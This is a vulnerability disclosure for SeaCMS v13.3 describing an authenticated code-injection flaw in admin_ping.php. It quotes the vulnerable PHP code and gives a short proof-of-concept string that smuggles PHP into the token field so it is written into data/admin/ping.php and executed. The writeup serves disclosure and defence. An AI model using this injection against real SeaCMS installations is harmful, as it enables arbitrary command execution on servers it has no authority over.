### Introduction

SeaCMS v13.3 contains a remote code execution vulnerability. This vulnerability arises from the following: although `admin_ping.php` applies some restrictions on the files being edited, attackers can bypass these restrictions and write code via concatenation, allowing authenticated attackers to exploit this vulnerability to execute arbitrary commands and gain system privileges.

SeaCMS official website: [SeaCMS - Open Source Free PHP Movie System, Movie CMS, Video CMS, Film CMS, SEACMS](https://www.seacms.com/)

Click to download
![](./public/1.png)

You can see the latest version v13.3
![](./public/2.png)

### Vulnerability Analysis and Exploitation  
The latest version of OceanCMS (v13.3) contains a command execution vulnerability.  
The vulnerable file is `0omeqd/admin_ping.php`, where PHP code concatenation is used, and is eventually written to the file `data/admin/ping.php`.

```php
<?php header('Content-Type:text/html;charset=utf-8');  
require_once(dirname(__FILE__)."/config.php");
if($action=="set")  
{  
    $weburl= $_POST['weburl'];  
    $token = $_POST['token'];  
    $open=fopen("../data/admin/ping.php","w" );  
    $str='<?php  ';  
    $str.='$weburl = "';  
    $str.="$weburl";  
    $str.='"; ';  
    $str.='$token = "';  
    $str.="$token";  
    $str.='"; ';  
    $str.=" ?>";  
    fwrite($open,$str);  
    fclose($open);  
    ShowMsg("Settings saved successfully!","admin_ping.php");  
    exit;  
}
```

The web page is located at the backend management path `0omeqd/admin_ping.php`. We inject concatenated PHP code into the second key field. The PoC is:

```r
123456789";phpinfo();$a="1
```

![Image1](./public/4-2.png.png)

After accessing the PHP path, the PHP code executes successfully.

```r
data/admin/ping.php
```

![Image1](./public/4-3.png.png)
